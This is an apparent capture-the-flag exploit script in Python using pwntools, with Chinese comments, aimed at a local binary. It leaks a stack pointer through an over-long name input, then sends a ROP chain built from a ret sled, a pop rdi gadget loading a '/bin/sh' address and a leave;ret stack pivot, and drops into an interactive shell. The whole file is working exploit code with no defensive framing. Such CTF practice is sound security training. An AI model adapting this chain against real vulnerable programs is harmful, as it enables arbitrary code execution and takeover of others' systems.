from pwn import*
context.log_level = 'debug'
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
p=process('./pwn')
binsh=0x402097
pop_rdi=0x4011d8
leave_ret=0x40127f
ret=0x40101a
addr1=0x4011C8

payload1=b'a'*257
p.recvuntil(b"what's your name?")
gdb.attach(p)
pause()
p.send(payload1)
data=p.recvuntil(b'your name is too long\n')
rbp=u64(data[257:263].ljust(8,b'\x00'))-0x61
#从第二个字节泄露rbp的值，其中切片是左闭右开，选中6个字节，因为高2字节为0，打印不出
print(hex(rbp))
rbp-=32
print(hex(rbp))
#滑雪橇，通过在payload前放置多个ret指令来做保护机制，只要得到的地址命中其中一个ret
#就能成功执行后续的ROP链，达到攻击目的
p.recvuntil(b"rename it")
payload=p64(ret)*0x1d+p64(pop_rdi)+p64(binsh)+p64(addr1)+p64(rbp)+p64(leave_ret)
p.send(payload)
p.interactive()